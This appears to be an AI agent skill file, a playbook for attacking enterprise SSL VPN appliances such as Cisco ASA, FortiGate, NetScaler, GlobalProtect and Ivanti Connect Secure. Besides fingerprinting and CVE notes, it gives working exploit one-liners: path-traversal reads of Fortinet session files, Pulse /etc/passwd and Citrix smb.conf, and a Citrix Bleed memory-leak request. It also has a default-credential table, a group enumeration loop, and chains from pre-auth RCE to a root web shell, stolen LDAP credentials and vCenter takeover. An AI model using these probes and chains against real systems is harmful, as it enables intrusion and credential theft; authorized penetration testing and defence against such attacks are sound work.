---
name: enterprise-vpn-attack
description: External SSL VPN / remote-access appliance attack matrix — Cisco ASA/AnyConnect, Fortinet FortiGate/FortiOS, Citrix NetScaler/ADC, Palo Alto GlobalProtect, Pulse Secure / Ivanti Connect Secure, SonicWall, F5 Big-IP. Covers version fingerprinting, CVE matrix (2018-2026), AAA backend identification, default credentials, configuration-disclosure paths, pre-auth RCE/SSRF/path-traversal exploits where applicable. Built from authorized-engagement Cisco ASA testing plus 2024-2026 enterprise VPN CVE landscape. Use whenever the target's perimeter exposes any SSL VPN appliance or remote-access gateway — these are the most common initial-access points in 2024-2026 actor TTPs.
---

**Reference files (load on demand):**

- `references/payloads.md` — payload banks, probes, wordlists, Nuclei templates, observed parameters
- `references/techniques.md` — quick wins, bypasses, real-report techniques, deeper checklists

## When to use this skill

Trigger when recon surfaces:
- `*.<client>.example/+CSCOE+/logon.html` or similar `+CSCOE+` paths → Cisco ASA / AnyConnect
- `intranet.*` / `vpn.*` / `connect.*` / `webvpn.*` / `wc.*` / `remote.*` subdomains
- Port 443 returning login pages with `Server: Apache` or banner like "AnyConnect", "FortiGate", "NetScaler", "GlobalProtect", "Pulse", "Ivanti"
- TCP 8443 / 4443 / 10443 / 8888 (common VPN web-mgmt ports)
- HTTP responses with `Set-Cookie: webvpn=` (Cisco) / `SVPNCOOKIE=` (Fortinet) / `NSC_AAA=` (Citrix) / `DSAuthSession=` (Pulse) / `BIGipServer*` (F5)

DO NOT use for:
- Internal lateral-movement post-foothold (out of scope per user's boundary)
- VPN client-side bugs (different attack class)
- IPsec / L2TP / OpenVPN (different protocols, not SSL VPN web stack)

---

## Vendor identification (fingerprinting)

### Cisco ASA / AnyConnect
```bash
curl -skI 'https://target/+CSCOE+/logon.html' | head -10
# Look for: Set-Cookie: webvpn=; X-Frame-Options: SAMEORIGIN; CSP: ... block-all-mixed-content
# Login page contains: "AnyConnect", "CSCOE", "logon.html"
```
ASA version: not banner-disclosed in modern builds; need to derive from JS file paths or test specific paths.

```bash
# Path-based version hints (older builds leaked builds in URLs)
curl -sk 'https://target/+CSCOE+/sdesktop/scan-finalize?path=test'
curl -sk 'https://target/+CSCOE+/saml/sp/metadata'         # 200 = SAML auth enabled
curl -sk 'https://target/CSCOSSLC/config-auth'             # AnyConnect handshake endpoint
```

### Fortinet FortiGate / FortiOS
```bash
curl -skI 'https://target/remote/login' | head -10
# Look for: Set-Cookie: SVPNCOOKIE=, Server header missing or "xxxxxxxx-xxxxx"
# Login page contains: "FortiGate", "Fortinet", "SSL-VPN"
```
Version: `/remote/info` sometimes leaks (older), or `/login?username=` 302 response

### Citrix NetScaler / ADC / Gateway
```bash
curl -skI 'https://target/' | head -10
# Look for: Set-Cookie: NSC_AAA=, Set-Cookie: NSC_USER=, Server: NetScaler
# Login page contains: "NetScaler", "Citrix Gateway"

# Version banner
curl -sk 'https://target/vpn/index.html' | grep -oE 'NetScaler/[0-9.]+|NS[0-9.]+'
curl -sk 'https://target/menu/neo'                # 200 if vulnerable to CVE-2019-19781 era
```

### Palo Alto GlobalProtect
```bash
curl -skI 'https://target/global-protect/login.esp' | head -10
# Look for: Set-Cookie: PHPSESSID= (yes, GP uses PHP), Server: Apache (PA-VM internal)
# Page contains: "GlobalProtect Portal", "PAN-OS"

# Version banner via login page
curl -sk 'https://target/global-protect/login.esp' | grep -oE 'GlobalProtect Portal[\s\S]{0,200}'
# Or check meta tag
curl -sk 'https://target/global-protect/login.esp' | grep -oE 'panui-[0-9.]+'
```

### Pulse Secure / Ivanti Connect Secure
```bash
curl -skI 'https://target/dana-na/auth/url_default/welcome.cgi' | head -10
# Look for: Set-Cookie: DSAuthSession=, DSPREAUTH=
# Page contains: "Pulse Secure" or "Ivanti Connect Secure"

# Version
curl -sk 'https://target/dana-na/auth/url_default/welcome.cgi' | grep -oE 'Pulse Connect Secure[^<]*|ivanti[^<]*[0-9.]+'
```

### SonicWall NetExtender / SMA
```bash
curl -skI 'https://target/cgi-bin/welcome' | head -10
# Look for: Set-Cookie: swap=, swapauth=
# Page contains: "SonicWall", "NetExtender", "SMA"
```

### F5 Big-IP / APM
```bash
curl -skI 'https://target/my.policy' | head -10
# Look for: Set-Cookie: BIGipServer*, MRHSession=
# Server: BIG-IP (sometimes)
```

---

## SAML SP / IdP misconfigurations (always check)

Most enterprise VPNs now use SAML for SSO. Check SP metadata:

```bash
# Cisco ASA
curl -sk 'https://target/+CSCOE+/saml/sp/metadata' | head -50

# Fortinet
curl -sk 'https://target/remote/saml/metadata' | head -50

# Citrix
curl -sk 'https://target/saml/login' | head -30
```

Look for:
- `AuthnRequestsSigned="false"` → see `saml` for XSW exploitation
- `WantAssertionsSigned="false"` → severe; assertion-replay possible
- Audience-restriction validation gaps
- Public SP signing cert (for replay/forging attacks)

---

## Default credentials (test sparingly — lockout risk)

| Vendor | User | Password | Notes |
|---|---|---|---|
| Cisco ASA | admin | cisco | Default factory; rarely seen in prod |
| Cisco ASA | enable_15 | cisco | Console |
| Fortinet | admin | (empty) | Factory default |
| Citrix NetScaler | nsroot | nsroot | Factory default |
| Citrix NetScaler | nsroot | (serial number) | Newer firmware |
| Palo Alto | admin | admin | Factory default |
| Pulse Secure | admin | password | Factory; CIS-hardened changes this |
| F5 Big-IP | root | default | Factory |
| F5 Big-IP | admin | admin | Common alternate |
| SonicWall | admin | password | Factory |

⚠ Most enterprise targets have changed these. Test ≤2 attempts per account to avoid lockout.

---

## Group / tunnel-group enumeration (Cisco-specific)

Cisco ASA AAA groups can sometimes be enumerated without auth.

```bash
# Tunnel group enumeration via timing
for group in DefaultRAGroup DefaultWEBVPNGroup SSLVPN Employees Contractors Vendors Partners Sales Marketing IT; do
  ms=$(curl -sk --max-time 10 -o /dev/null -w "%{time_total}" \
    -X POST "https://target/+webvpn+/index.html" \
    -d "username=test&password=test&group_list=$group&tgroup=&Login=Login")
  echo "$group: ${ms}s"
done
# Larger differential timing = group exists; valid groups respond slower in some builds
```

---

## AAA backend identification

After auth fails, look at error response details:

| Pattern in response | AAA backend |
|---|---|
| `a0=2` (Cisco) | Unknown user |
| `a0=3` (Cisco) | Wrong password |
| `a0=4` (Cisco) | Login restricted |
| `a0=12` (Cisco) | Account locked |
| `a0=115` (Cisco) | Generic auth fail (LDAP/RADIUS/AD layer error) |
| AADSTS in response body | Backed by Entra (SAML) |
| `Authentication failed via RADIUS` | RADIUS backend |
| `Invalid username or password` (generic) | LDAP or local DB |

If you see SAML/Entra in the flow, pivot to `m365-entra-attack` skill for cred-spray strategy.

---

## Common probe sequence (5-minute fingerprint)

```bash
TARGET="vpn.target.com"

# Cisco
curl -skI "https://$TARGET/+CSCOE+/logon.html" 2>&1 | head -3
curl -sk "https://$TARGET/+CSCOE+/saml/sp/metadata" -o /tmp/cisco_saml.xml; ls -la /tmp/cisco_saml.xml
curl -sk --path-as-is "https://$TARGET/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest" -o /tmp/cisco_cve.html

# Fortinet
curl -skI "https://$TARGET/remote/login" 2>&1 | head -3
curl -sk --path-as-is "https://$TARGET/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession" -o /tmp/forti_cve.txt; head -c 200 /tmp/forti_cve.txt

# Citrix
curl -skI "https://$TARGET/" 2>&1 | head -3
curl -sk --path-as-is "https://$TARGET/vpn/../vpns/cfg/smb.conf" -o /tmp/citrix_cve.txt; head -c 200 /tmp/citrix_cve.txt
HOST=$(python3 -c "print('A' * 24812)")
curl -sk -X POST -H "Host: $HOST" "https://$TARGET/oauth/idp/.well-known/openid-configuration" -o /tmp/citrix_bleed.txt
wc -c /tmp/citrix_bleed.txt

# Palo Alto
curl -skI "https://$TARGET/global-protect/login.esp" 2>&1 | head -3

# Pulse / Ivanti
curl -skI "https://$TARGET/dana-na/auth/url_default/welcome.cgi" 2>&1 | head -3
curl -sk --path-as-is "https://$TARGET/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" -o /tmp/pulse_cve.txt; head -c 200 /tmp/pulse_cve.txt
```

---

## Operational discipline

- **Banner-stripped servers (no version disclosure)** are good defense-in-depth — record as positive finding even if no CVE found
- **Rate-limit yourself** — these appliances often log every request to a SIEM. Patient pace, jittered timing.
- **SAML metadata is anonymous** — pull it. It's intel about AAA backend.
- **Don't run pre-auth-RCE PoCs in red team without explicit OK** — accidentally bricking a VPN concentrator = catastrophic for the client. Detection-only tests first, then escalate with permission.
- **Document the AAA backend identification** — knowing whether ASA uses RADIUS-to-local vs SAML-to-Entra changes downstream attack paths.

---

## Bridge to neighboring skills

- `m365-entra-attack` — when AAA backend is Entra SAML; cred-spray strategy carries over
- `saml` — XSW / signature-stripping if SAML SP is misconfigured
- `mid-engagement-ir-detection` — appliances generate noisy logs; watch for IPS rules being deployed mid-engagement
- `redteam-mindset` — banner-stripped ≠ "not vulnerable"; keep digging via behavioral fingerprints

---

## Anti-patterns

- **Don't conclude "patched" from a 404 on one CVE path** — patches deploy unevenly; test 3+ CVEs per vendor
- **Don't trust the version banner alone** — appliance vendors often backport fixes without bumping the version string
- **Don't run heavy nuclei scans without rate-limiting** — these appliances are critical infrastructure
- **Don't fingerprint by trying all CVE PoCs immediately** — start with non-disruptive HEAD + version-banner probes
- **Don't skip SAML metadata** — even when the appliance is patched, SAML SP misconfig is its own attack surface

---

## Related Skills & Chains

- **`rce`** — Every major VPN appliance (Pulse Secure, Fortinet, Citrix, Ivanti, Palo Alto) has shipped pre-auth path-traversal-to-RCE in the last 24 months. Chain primitive: VPN appliance CVE (e.g., Ivanti ICS CVE-2024-21887, Citrix Bleed CVE-2023-4966, Fortinet CVE-2024-21762) → `rce` pre-auth path traversal → arbitrary file write into web-root → request the file → web-shell as `root` → VPN config + LDAP bind credentials extracted.
- **`saml`** — VPN SAML SP misconfig persists even on fully-patched appliances. Chain primitive: appliance patched against latest CVE but `/saml/metadata` reachable → IdP fingerprinted → `saml` XSW or comment-injection against IdP → forged assertion → VPN session established without password/MFA.
- **`vmware-vcenter-attack`** — Post-VPN-foothold the natural next pivot is vCenter. Chain primitive: VPN web-shell → cred extraction from VPN appliance config (LDAP bind, RADIUS shared secret) → reuse against internal vCenter → if scope permits, `vmware-vcenter-attack` → datacenter takeover.
- **`ntlm-info`** — Some VPN appliances expose anonymous NTLM on management paths. Chain primitive: VPN admin portal NTLM Type-2 capture → `ntlm-info` AV_PAIR decode → internal AD forest name → `m365-entra-attack` Entra spray on synced tenant.
- **`mid-engagement-ir-detection`** + **`redteam-report-template`** — VPN appliance CVE exploitation is high-noise; SOC patches fast. Chain primitive: confirmed CVE → baseline capture via `mid-engagement-ir-detection` → if appliance updates mid-test, capture the patched-state as a SECOND finding → run both findings through `triage-validation` → package via `redteam-report-template` with explicit critical-infrastructure framing.

---

## Web-Research Methodology Additions (2026)

### A. Discovery checklist — concrete fingerprints, endpoints, headers, CVEs, misconfigs to look for

- **Ivanti Connect Secure — the 2026 zero-day chain (CISA KEV Oct 13/30 2026).** Three CVEs chained for unauth RCE + credential theft: **CVE-2026-104935** (auth bypass by spoofing, CWE-290, CVSS 8.6, remote unauth command execution; affects ICS <25.1.3.0 / 25.1.1.1+ / 25.1.2.2+ / 22.8R2.4+; 22.7.x NOT affected), **CVE-2026-111357** (missing auth for critical function → local priv esc, CWE-306/862/345, CVSS 8.8), **CVE-2026-118527** (predictable filenames → arbitrary upload, CWE-340, CVSS 4.3). Earlier 2025 KEVs: **CVE-2025-22457** (stack overflow) and **CVE-2025-0282** (stack overflow; RESURGE malware variant undermines mitigations). **Critical detection caveat: Ivanti's Integrity Checker Tool may not detect CVE-2026-104935 exploitation — commands execute in memory; CISA requires network + memory forensics.** EoL: 22.8 on 2027-01-31.
- **Citrix NetScaler ADC/Gateway — Sept-Oct 2026 zero-day cluster.** **CVE-2026-88771** (improper input validation → unauth RCE, CVSS 9.5, no preconditions — all deployments; KEV 9/27/26), **CVE-2026-88772** (memory overflow → RCE/DoS, affects **DTLS enabled on VPN vServer** — default on; KEV 9/27/26), **CVE-2026-88773** (HTTP request smuggling via HTTP URL-based policy expression), **CVE-2026-88774** (feature policy bypass), **CVE-2026-88775/76/77** (memory overflows with gateway/AAA vServer, Oracle LB vServer, or non-HTTP L7 LB/CS/CGNAT configs), **CVE-2026-88778** (TCP ISN prediction when Enhanced ISN Generation disabled), **CVE-2026-88779** (SAML SP/IdP DoS; can force a reboot to detonate code injected via 88771 — KEV 10/4/26), **CVE-2026-107406** (SAML SP/IdP memory overflow RCE/DoS; earlier patches insufficient). Affected: 14.1 < 14.1-73.37, 13.1 < 13.1-64.23, FIPS/NDcPP variants. Older still: CVE-2025-7775 (memory overflow RCE, KEV 2025-08-26), CVE-2026-3055 (SAML IdP out-of-bounds read).
- **Cisco ASA/FTD — 2025-2026 exploitation wave.** ArcaneDoor: **CVE-2025-20362 / CVE-2025-20333** (VPN web services, 5500-X, ED 25-03) plus a **persistence mechanism in FXOS that survives upgrading to the "fixed" Sept 2025 releases** (Cisco event response updated Apr 2026). 2026 zero-days: **CVE-2026-20349** (heap inspection, unauth crafted HTTP → SSL VPN device reload; requires WebVPN, IKEv2 client-services, or FTD ZTNA), **CVE-2026-76418** (secondary authentication configured on a tunnel group → crafted SSL VPN connection request → reload; CVSS 8.6, KEV 10/29/26). Fingerprint config with `show running-config webvpn` / `crypto ikev2`. Shadowserver tracked >51,000 exposed Cisco ASA SSL VPN devices.
- **Fortinet FortiOS:** **CVE-2025-25249** (cw_acd heap overflow, CVSS 9.8/8.1, KEV 9/9/26; workaround = remove `fabric` from `allowaccess` or block UDP 5246-5249 CAPWAP) and **CVE-2025-61624** (CLI path traversal, admin read-write, arbitrary file write/delete, KEV 10/16/26). Also 2026 KEVs for Check Point VPN and Palo Alto (see CISA 2026 roundups).
- **Palo Alto/Check Point:** include in the 5-KEV fall-2026 firewall roundup (CISA KEV 9/9-10/29/2026) — two pre-auth, one DoS, two need privileged login. Always check the configuration preconditions rather than banner-only.

### B. Techniques & bypasses — specific actionable techniques/payload shapes

```bash
# Configuration-precondition probes (detection-only — no exploit execution)
TARGET=vpn.target.com
# Ivanti: fingerprint build precisely (22.7 vs 22.8 vs 25.1 determines applicability)
curl -sk "https://$TARGET/dana-na/auth/url_default/welcome.cgi" | grep -oEi 'ivanti|pulse connect secure|25\.1|22\.8R[0-9.]+'
# Citrix: DTLS-on-VPN-vServer is the precondition for CVE-2026-88772
curl -skI "https://$TARGET/" | grep -iE 'nsc_aaa|netscaler'
curl -sk "https://$TARGET/vpn/index.html" | grep -oEi 'netscaler/[0-9.]+|14\.1-[0-9.]+|13\.1-[0-9.]+'
# Cisco: confirm webvpn/secondary auth exposure via error behavior, not a crash PoC
curl -sk "https://$TARGET/+CSCOE+/logon.html" | grep -iE 'logon|group_list|secondary'
# Fortinet: CAPWAP service exposure (UDP 5246-5249) is the CVE-2025-25249 gate
#   -> verify from the exported config / external UDP scan, not from the web login page.

# Post-exploitation forensics tell (Ivanti 2026): ICT is blind to in-memory commands.
#   CISA: capture network + memory; look for web-shell processes, unexpected outbound C2.
# Citrix: run the IOCs in NetScaler Console; CISA flags 88772 for BOD 26-04 forensic triage.
# Cisco ArcaneDoor: patching is NOT enough — FXOS persistence survives; collect FXOS image.
```

Chain priority for reporting: **Ivanti 104935 + 111357 + 118527** (unauth RCE → local priv esc → persistence upload) and **Citrix 88771 → 88779** (RCE → forced reboot to re-detonate injected code) are the two multi-CVE chains that turn a "patched" appliance into a confirmed compromise.

### C. Validation / proof bar — how to confirm and avoid false positives

- **Never prove a VPN CVE by crashing or writing to the appliance.** These are critical-infrastructure devices: use version/build fingerprint + configuration precondition + (where available) non-destructive indicators. CISA's KEV entries with "forensic triage required" mean you must hunt for prior compromise (memory/network forensics, IOCs) *in addition to* checking patch state.
- **Patch-status traps:** Ivanti 22.7.x is NOT affected by 104935 but is EoL; Citrix patches for 88771-88778 do NOT cover 88779/107406; Cisco ArcaneDoor persistence survives the Sept 2025 fixed release. A "patched" banner is therefore not proof of safety — document each specific CVE applicability.
- **Configuration gates are the finding, not the CVE number:** secondary auth on a tunnel group (Cisco 76418), DTLS on VPN vServer (Citrix 88772), fabric on `allowaccess` (Fortinet 25249), pass-through modules (analogous to Okta checks). If the config is absent, downgrade to Informational.
- **Do not trust single-path 404s:** keep the existing "test 3+ CVEs per vendor" rule; vendors backport fixes without bumping version strings.
- **If a CVE is confirmed, assume breach:** CISA/Ivanti guidance is factory reset + rebuild cloud/virtual images + reissue all certs/API keys/passwords + reset domain creds twice and revoke Kerberos tickets in hybrid deployments. Capture this as a remediation note in the report; "we patched" is not containment for in-memory or FXOS-resident tradecraft.

### D. Sources — numbered list of URLs you actually fetched

1. https://www.cisa.gov/news-events/alerts/2026/10/13/cisa-urges-patching-newly-exploited-vulnerabilities-ivanti-connect-secure
2. https://hub.ivanti.com/s/article/Security-Advisory-Ivanti-Connect-Secure-CVE-2026-104935
3. https://www.cisa.gov/cisa-mitigation-instructions-cve-2025-0282
4. https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/Pulse-Ivanti-Connect-Secure-Policy-Secure-and-Neurons-for-ZTA-gateways
5. https://www.cisa.gov/news-events/alerts/2026/09/27/critical-zero-day-vulnerabilities-exploited-citrix-netscaler-adc-gateway
6. https://www.ncsc.gov.uk/news/exploitation-of-vulnerabilities-affecting-citrix-netscaler-adc-and-citrix-netscaler-gateway
7. https://cert.europa.eu/publications/security-advisories/2026-014
8. https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-tunnel-dos-s6mgkb75
9. https://sec.cloudapps.cisco.com/security/center/resources/asa_ftd_continued_attacks
10. https://www.bleepingcomputer.com/news/security/cisco-warns-of-firewall-zero-day-exploited-to-crash-ssl-vpn-devices
11. https://www.cyber.gc.ca/en/alerts-advisories/al26-018-vulnerability-affecting-cisco-asa-secure-firewall-threat-defense-software-remote-access-ssl-vpn-cve-2026-20349
12. https://crwlr.io/blog/firewall-cve-watch-november-2026
13. https://www.cisa.gov/news-events/alerts/2026/09/09/cisa-adds-four-known-exploited-vulnerabilities-catalog
14. https://www.cisa.gov/known-exploited-vulnerabilities-catalog
